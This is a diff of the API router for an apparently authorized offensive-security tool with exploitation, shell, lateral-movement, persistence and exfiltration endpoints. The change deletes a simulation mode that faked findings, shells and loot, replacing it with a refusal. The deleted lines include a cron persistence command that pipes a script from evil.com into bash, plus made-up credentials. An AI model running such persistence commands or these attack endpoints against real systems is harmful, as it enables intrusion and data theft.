@@ -8,7 +8,6 @@ and an explicit ownership acknowledgment. All actions are persisted to the
 
 import logging
 import os
-import time
 from typing import Any
 
 import jwt
@@ -23,10 +22,7 @@ from app.agents.exfil import ExfiltrationAgent, decrypt_to_temp, resolve_archive
 from app.agents.brutal_exploit import ExploitationEngine, SUPPORTED_CATEGORIES
 from app.agents.lateral_movement import LateralMovementAgent
 from app.agents.post_exploit import PostExploitationAgent, install_persistence
-from app.agents.simulation_finder import SimulationExploitEngine, SimulationFinder
 from app.agents.simulation_intel import SimulationIntel
-from app.agents.simulation_loot import SimulationLoot
-from app.agents.simulation_shell import SimulationShell, SimulationShellRegistry
 from app.brutal_gate import BrutalGate, BrutalGateError
 from app.brutal_sessions import BrutalSessionManager
 from app.config import get_settings
@@ -98,6 +94,18 @@ def _deny(exc: BrutalGateError) -> HTTPException:
     return HTTPException(status_code=exc.http_status, detail={"code": exc.code, "message": exc.message})
 
 
+def _simulation_readonly() -> HTTPException:
+    """Refuse fabricated operations on a simulation session (passive intel only)."""
+    return HTTPException(
+        status_code=status.HTTP_409_CONFLICT,
+        detail=(
+            "Simulation sessions collect passive intel only (DNS + one HTTP request). "
+            "Run Brutal Mode against the PhantomBank Lab, or enable real exploitation "
+            "(EXPLOITATION_ENABLED=true) for Private Scope targets."
+        ),
+    )
+
+
 def _session_or_404(session_id: str) -> Any:
     try:
         return BrutalSessionManager.require(session_id)
@@ -166,15 +174,11 @@ async def create_session(request: SessionCreateRequest, user: dict = Depends(get
     await session.save_new()
     if request.simulation:
         intel = await SimulationIntel(request.target_url).gather_intel()
-        findings = SimulationFinder(intel).generate_findings()
         session.sim_intel = intel
-        session.sim_findings = findings
-        counts = SimulationFinder.count_by_severity(findings)
         await session.log_op(
             "intel_gathered",
             "success",
-            f"Simulation intel gathered for {hostname} — {len(findings)} simulated findings "
-            f"({counts.get('CRITICAL', 0)} Critical, {counts.get('HIGH', 0)} High, {counts.get('MEDIUM', 0)} Medium)",
+            f"Passive intel gathered for {hostname} — tech_stack={intel.get('tech_stack')} ip={intel.get('ip')}",
             output=f"tech_stack={intel.get('tech_stack')} ip={intel.get('ip')}",
         )
     else:
@@ -221,8 +225,7 @@ async def run_exploit(
 ) -> dict[str, Any]:
     session = await _gate_session(user, session_id, ack=False)
     if session.simulation:
-        engine = SimulationExploitEngine(session)
-        return await engine.exploit(request.category, request.finding)
+        raise _simulation_readonly()
     engine = ExploitationEngine(session)
     return await engine.exploit(request.category, request.finding)
 
@@ -239,28 +242,7 @@ async def open_shell(
     session = await _gate_session(user, session_id, ack=False)
     os_hint = request.os_hint if request is not None else "auto"
     if session.simulation:
-        shell_id = SimulationShellRegistry.create(session.session_id, session.sim_intel)
-        shell = SimulationShellRegistry.get(shell_id)
-        await session.log_op(
-            "shell_opened",
-            "success",
-            f"Simulated shell obtained on {session.sim_intel.get('hostname', 'target')} (os={os_hint})",
-            output="simulated www-data terminal ready",
-        )
-        return {
-            "shell_id": shell_id,
-            "session_id": session_id,
-            "target_url": session.target_url,
-            "os_hint": os_hint,
-            "created_at": time.time(),
-            "closed": False,
-            "command_count": 0,
-            "remaining_budget": shell.remaining_budget,
-            "last_output": "",
-            "last_exit_code": None,
-            "commands": [],
-            "simulated": True,
-        }
+        raise _simulation_readonly()
     shell = ShellSessionManager.create(session_id, session.target_url, user["id"], os_hint)
     await session.log_op(
         "shell_opened",
@@ -273,23 +255,6 @@ async def open_shell(
 
 @router.get("/shell/{shell_id}")
 async def shell_info(shell_id: str, user: dict = Depends(get_current_user)) -> dict[str, Any]:
-    sim_shell = SimulationShellRegistry.get(shell_id)
-    if sim_shell:
-        await _gate_session(user, sim_shell.session_id, ack=False)
-        return {
-            "shell_id": shell_id,
-            "session_id": sim_shell.session_id,
-            "target_url": sim_shell.target_url,
-            "os_hint": "linux",
-            "created_at": time.time(),
-            "closed": sim_shell.closed,
-            "command_count": sim_shell.command_count,
-            "remaining_budget": sim_shell.remaining_budget,
-            "last_output": "",
-            "last_exit_code": None,
-            "commands": [],
-            "simulated": True,
-        }
     shell = _shell_or_404(shell_id)
     await _gate_session(user, shell.session_id, ack=False)
     return ShellSessionManager.serialize(shell)
@@ -297,10 +262,6 @@ async def shell_info(shell_id: str, user: dict = Depends(get_current_user)) -> d
 
 @router.post("/shell/{shell_id}/exec")
 async def shell_exec(shell_id: str, request: ExecRequest, user: dict = Depends(get_current_user)) -> dict[str, Any]:
-    sim_shell = SimulationShellRegistry.get(shell_id)
-    if sim_shell:
-        await _gate_session(user, sim_shell.session_id, ack=False)
-        return await sim_shell.execute(request.command)
     shell = _shell_or_404(shell_id)
     await _gate_session(user, shell.session_id, ack=False)
     return await run_command(shell, request.command)
@@ -308,12 +269,6 @@ async def shell_exec(shell_id: str, request: ExecRequest, user: dict = Depends(g
 
 @router.delete("/shell/{shell_id}")
 async def close_shell(shell_id: str, user: dict = Depends(get_current_user)) -> dict[str, str]:
-    sim_shell = SimulationShellRegistry.get(shell_id)
-    if sim_shell:
-        await _gate_session(user, sim_shell.session_id, ack=False)
-        sim_shell.closed = True
-        SimulationShellRegistry.remove(shell_id)
-        return {"status": "closed"}
     shell = _shell_or_404(shell_id)
     await _gate_session(user, shell.session_id, ack=False)
     ShellSessionManager.close(shell_id)
@@ -322,13 +277,6 @@ async def close_shell(shell_id: str, user: dict = Depends(get_current_user)) -> 
 
 @router.get("/shell/{shell_id}/payloads")
 async def shell_payloads(shell_id: str, user: dict = Depends(get_current_user)) -> dict[str, Any]:
-    sim_shell = SimulationShellRegistry.get(shell_id)
-    if sim_shell:
-        await _gate_session(user, sim_shell.session_id, ack=False)
-        return {
-            "reverse_shell": PayloadFactory.reverse_shell_payloads(),
-            "bind_shell": PayloadFactory.bind_shell_payloads(),
-        }
     shell = _shell_or_404(shell_id)
     await _gate_session(user, shell.session_id, ack=False)
     return {
@@ -355,24 +303,7 @@ async def _require_open_shell(session_id: str) -> Any:
 async def post_exploit(session_id: str, user: dict = Depends(get_current_user)) -> dict[str, Any]:
     session = await _gate_session(user, session_id, ack=False)
     if session.simulation:
-        hostname = session.sim_intel.get("hostname", "target")
-        enum = {
-            "user": f"uid=33(www-data) gid=33(www-data) groups=33(www-data)",
-            "hostname": hostname,
-            "kernel": "Linux " + hostname + " 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux",
-            "network": "eth0: 10.0.0.1/24\nlo: 127.0.0.1/8",
-            "processes": "www-data  123  0.1  0.5  45678 12345 ?  S  09:31  0:05 /usr/sbin/apache2",
-            "env": "DB_HOST=localhost\nDB_USER=root\nDB_PASS=Sup3rS3cr3t!2026\nAPI_KEY=sk-...",
-        }
-        privesc = [
-            "SUID: /usr/bin/passwd, /usr/bin/sudo",
-            "sudo -l: (ALL) NOPASSWD: /usr/bin/php",
-            "cron: */15 * * * * root /usr/local/bin/cleanup.sh",
-        ]
-        session.add_loot("enumeration", "enum.txt", str(enum), "post_exploit (simulated)")
-        session.add_loot("privesc", "privesc.txt", str(privesc), "post_exploit (simulated)")
-        await session.log_op("post_exploit", "success", "Post-exploitation enumeration complete (simulated)")
-        return {"summary": "Post-exploitation complete (simulated)", "enumeration": enum, "privesc": privesc}
+        raise _simulation_readonly()
     shell = await _require_open_shell(session_id)
     agent = PostExploitationAgent(session, shell)
     enumeration = await agent.enumerate_system()
@@ -384,15 +315,7 @@ async def post_exploit(session_id: str, user: dict = Depends(get_current_user)) 
 async def lateral_movement(session_id: str, user: dict = Depends(get_current_user)) -> dict[str, Any]:
     session = await _gate_session(user, session_id, ack=False)
     if session.simulation:
-        internal = [
-            {"host": "10.0.0.2", "hostname": "db.internal", "service": "mysql", "port": 3306, "creds": "root / Sup3rS3cr3t!2026"},
-            {"host": "10.0.0.3", "hostname": "cache.internal", "service": "redis", "port": 6379, "creds": "no auth"},
-            {"host": "10.0.0.4", "hostname": "backups.internal", "service": "nfs", "port": 2049, "creds": "anonymous"},
-        ]
-        session.add_loot("network", "lateral_map.txt", str(internal), "lateral (simulated)")
-        session.add_loot("credentials", "mysql_root.txt", "root:Sup3rS3cr3t!2026", "lateral (simulated)")
-        await session.log_op("lateral_movement", "success", f"Pivoted to {len(internal)} internal hosts (simulated)")
-        return {"summary": f"Discovered {len(internal)} internal hosts (simulated)", "hosts": internal}
+        raise _simulation_readonly()
     shell = await _require_open_shell(session_id)
     agent = LateralMovementAgent(session, shell)
     return await agent.run()
@@ -402,10 +325,7 @@ async def lateral_movement(session_id: str, user: dict = Depends(get_current_use
 async def persist(session_id: str, request: PersistRequest, user: dict = Depends(get_current_user)) -> dict[str, Any]:
     session = await _gate_session(user, session_id, ack=False)
     if session.simulation:
-        payload = "*/5 * * * * root curl -s http://evil.com/persist.sh | bash # simulated"
-        session.add_loot("persistence", "cron_persist.sh", payload, "persist (simulated)")
-        await session.log_op("persist_installed", "success", "Persistence installed via cron (simulated)")
-        return {"summary": "Persistence installed (simulated)", "payload": payload, "kind": request.kind}
+        raise _simulation_readonly()
     shell = await _require_open_shell(session_id)
     return await install_persistence(session, shell, request.kind, request.command)
 
@@ -417,14 +337,7 @@ async def persist(session_id: str, request: PersistRequest, user: dict = Depends
 async def exfil(session_id: str, user: dict = Depends(get_current_user)) -> dict[str, Any]:
     session = await _gate_session(user, session_id, ack=False)
     if session.simulation:
-        if not session.loot:
-            loot = SimulationLoot(session.sim_intel).generate_loot()
-            for item in loot:
-                session.add_loot(item["kind"], item["file"], item["content"], "exfil (simulated)")
-        agent = ExfiltrationAgent(session)
-        result = await agent.pack()
-        await session.log_op("exfil_complete", "success", "Exfiltration complete (simulated)")
-        return result
+        raise _simulation_readonly()
     agent = ExfiltrationAgent(session)
     try:
         result = await agent.pack()
@@ -509,40 +422,6 @@ async def brutal_shell_ws(websocket: WebSocket, shell_id: str) -> None:
         # 4001 (token expired) lets the client refresh and reconnect;
         # 1008 means the credential is genuinely invalid.
         await websocket.close(code=4001 if expired else 1008)
-        return
-
-    # Simulation shell?
-    sim_shell = SimulationShellRegistry.get(shell_id)
-    if sim_shell:
-        try:
-            await gate.authorize(user, sim_shell.target_url or sim_shell.hostname, False, require_ack=False)
-        except BrutalGateError:
-            await websocket.close(code=1008)
-            return
-        await websocket.accept()
-        await websocket.send_text("__ready__")
-        try:
-            while True:
-                command = await websocket.receive_text()
-                if not command.strip():
-                    continue
-                if command.strip().lower() in ("exit", "quit"):
-                    sim_shell.closed = True
-                    SimulationShellRegistry.remove(shell_id)
-                    await websocket.send_text("__closed__")
-                    break
-                result = await sim_shell.execute(command)
-                await websocket.send_text(
-                    result.get("output", result.get("error", "")) or "(no output)"
-                )
-        except WebSocketDisconnect:
-            pass
-        except Exception as exc:
-            logger.warning("Brutal shell WS error (sim): %s", exc)
-            try:
-                await websocket.send_text(f"[console error: {exc}]")
-            except Exception:
-                pass
         return
 
     shell = ShellSessionManager.get(shell_id)
